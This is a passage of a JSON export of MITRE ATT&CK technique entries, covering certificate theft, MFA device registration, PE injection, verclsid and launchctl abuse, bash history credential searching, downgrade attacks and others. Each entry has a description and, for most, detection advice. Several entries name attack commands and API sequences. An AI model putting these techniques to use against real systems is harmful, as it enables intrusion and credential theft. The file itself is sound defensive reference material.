      "description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.(Citation: Medium Certified Pre Owned)\n\nAbusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as \u201cgolden\u201d certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1649",
      "stix_id": "attack-pattern--7de1f7ac-5d0c-4c9c-8873-627202205331",
      "created": "2022-08-03T03:20:58.955000+00:00",
      "modified": "2025-04-15T23:12:50.646000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Application Log: Application Log Content",
        "Active Directory: Active Directory Credential Request",
        "Active Directory: Active Directory Object Modification",
        "Windows Registry: Windows Registry Key Access",
        "File: File Access",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1098.005": {
      "id": "T1098.005",
      "name": "Device Registration",
      "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)\n\nSimilarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Entra ID tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1098.005",
      "stix_id": "attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215",
      "created": "2022-03-04T18:30:38.989000+00:00",
      "modified": "2025-04-15T22:17:39.860000+00:00",
      "platforms": [
        "Windows",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Active Directory: Active Directory Object Creation",
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1049": {
      "id": "T1049",
      "name": "System Network Connections Discovery",
      "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, the command `esxi network ip connection list` can be used to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1049",
      "stix_id": "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475",
      "created": "2017-05-31T21:30:45.139000+00:00",
      "modified": "2025-04-15T19:58:45.496000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather system and network information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1584": {
      "id": "T1584",
      "name": "Compromise Infrastructure",
      "description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Adversaries may also compromise numerous machines to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services or to form a botnet.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking) Additionally, adversaries may compromise infrastructure residing in close proximity to a target in order to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) via [Wi-Fi Networks](https://attack.mitre.org/techniques/T1669).(Citation: Nearest Neighbor Volexity)\n\nBy using compromised infrastructure, adversaries may enable follow-on malicious operations. Prior to targeting, adversaries may also compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584",
      "stix_id": "attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9",
      "created": "2020-10-01T00:36:30.759000+00:00",
      "modified": "2025-04-15T19:58:45.612000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content",
        "Domain Name: Domain Registration",
        "Domain Name: Active DNS",
        "Domain Name: Passive DNS",
        "Internet Scan: Response Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet. \n\nOnce adversaries have provisioned compromised infrastructure (ex: a server for use in command and control), internet scans may help proactively discover compromised infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1553.005": {
      "id": "T1553.005",
      "name": "Mark-of-the-Web Bypass",
      "description": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1553.005",
      "stix_id": "attack-pattern--7e7c2fba-7cca-486c-9582-4c1bb2851961",
      "created": "2021-02-22T14:20:31.650000+00:00",
      "modified": "2025-04-15T19:58:45.702000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.(Citation: Disable automount for ISO)"
    },
    "T1600.002": {
      "id": "T1600.002",
      "name": "Disable Crypto Hardware",
      "description": "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1600.002",
      "stix_id": "attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5",
      "created": "2020-10-19T19:11:18.757000+00:00",
      "modified": "2025-04-25T14:47:14.891000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "There is no documented method for defenders to directly identify behaviors that disable cryptographic hardware. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation."
    },
    "T1542": {
      "id": "T1542",
      "name": "Pre-OS Boot",
      "description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1542",
      "stix_id": "attack-pattern--7f0ca133-88c4-40c6-a62f-b3083a7fbc2e",
      "created": "2019-11-13T14:44:49.439000+00:00",
      "modified": "2025-04-15T19:58:45.876000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Drive: Drive Modification",
        "File: File Modification",
        "Network Traffic: Network Connection Creation",
        "File: File Creation",
        "Process: OS API Execution",
        "Driver: Driver Metadata",
        "Command: Command Execution",
        "Firmware: Firmware Modification"
      ],
      "defense_bypassed": [],
      "detection": "Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.\n\nDisk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014)"
    },
    "T1612": {
      "id": "T1612",
      "name": "Build Image on Host",
      "description": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)\n\nAn adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it\u2019s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1612",
      "stix_id": "attack-pattern--800f9819-7007-4540-a520-40e655876800",
      "created": "2021-03-30T17:54:03.944000+00:00",
      "modified": "2025-04-15T21:54:42.589000+00:00",
      "platforms": [
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Image: Image Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment. Additionally monitor for subsequent network communication with anomalous IPs that have never been seen before in the environment that indicate the download of malicious code."
    },
    "T1055.002": {
      "id": "T1055.002",
      "name": "Portable Executable Injection",
      "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.002",
      "stix_id": "attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662",
      "created": "2020-01-14T01:27:31.344000+00:00",
      "modified": "2025-04-25T14:47:15.984000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Access",
        "Process: OS API Execution",
        "Process: Process Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1218.012": {
      "id": "T1218.012",
      "name": "Verclsid",
      "description": "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.012",
      "stix_id": "attack-pattern--808e6329-ca91-4b87-ac2d-8eadc5f8f327",
      "created": "2020-08-10T13:59:38.443000+00:00",
      "modified": "2025-04-15T19:58:46.323000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of verclsid.exe. Compare recent invocations of verclsid.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of verclsid.exe may also be useful in determining the origin and purpose of the payload being executed. Depending on the environment, it may be unusual for verclsid.exe to have a parent process of a Microsoft Office product. It may also be unusual for verclsid.exe to have any child processes or to make network connections or file modifications."
    },
    "T1586": {
      "id": "T1586",
      "name": "Compromise Accounts",
      "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1586",
      "stix_id": "attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a",
      "created": "2020-10-01T01:17:15.965000+00:00",
      "modified": "2025-04-15T22:07:30.871000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Persona: Social Media",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566))."
    },
    "T1569.001": {
      "id": "T1569.001",
      "name": "Launchctl",
      "description": "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)\n\nAdversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)\n",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1569.001",
      "stix_id": "attack-pattern--810aa4ad-61c9-49cb-993f-daa06199421d",
      "created": "2020-03-10T18:26:56.187000+00:00",
      "modified": "2025-04-15T19:58:46.562000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Service: Service Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Every Launch Agent and Launch Daemon must have a corresponding plist file on disk which can be monitored. Monitor for recently modified or created plist files with a significant change to the executable path executed with the command-line <code>launchctl</code> command. Plist files are located in the root, system, and users <code>/Library/LaunchAgents</code> or <code>/Library/LaunchDaemons</code> folders. \n\nMonitor command-line execution of the <code>launchctl</code> command immediately followed by abnormal network connections. [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s with executable paths pointing to <code>/tmp</code> and <code>/Shared</code> folders locations are potentially suspicious. \n\nWhen removing [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s ensure the services are unloaded prior to deleting plist files."
    },
    "T1584.005": {
      "id": "T1584.005",
      "name": "Botnet",
      "description": "Adversaries may compromise numerous third-party systems to form a botnet\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584.005",
      "stix_id": "attack-pattern--810d8072-afb6-4a56-9ee7-86379ac4a6f3",
      "created": "2020-10-01T00:58:35.269000+00:00",
      "modified": "2025-04-16T13:38:12.734000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498)."
    },
    "T1059.008": {
      "id": "T1059.008",
      "name": "Network Device CLI",
      "description": "Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.008",
      "stix_id": "attack-pattern--818302b2-d640-477b-bf88-873120ce85c4",
      "created": "2020-10-20T00:09:33.072000+00:00",
      "modified": "2025-04-16T20:37:18.015000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.(Citation: Cisco IOS Software Integrity Assurance - Command History)\n\nConsider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor."
    },
    "T1552.003": {
      "id": "T1552.003",
      "name": "Bash History",
      "description": "Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552.003",
      "stix_id": "attack-pattern--8187bd2a-866f-4457-9009-86b0ddedffa3",
      "created": "2020-02-04T13:02:11.685000+00:00",
      "modified": "2025-04-15T21:52:49.389000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~/.bash_history</code>."
    },
    "T1562.010": {
      "id": "T1562.010",
      "name": "Downgrade Attack",
      "description": "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation. \n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation: Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)\n\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation: Crowdstrike Downgrade) On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms.(Citation: SafeBreach)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.010",
      "stix_id": "attack-pattern--824add00-99a1-4b15-9a2d-6c5683b7b497",
      "created": "2021-10-08T14:06:28.212000+00:00",
      "modified": "2025-04-15T19:58:46.929000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: Process Metadata"
      ],
      "defense_bypassed": [],
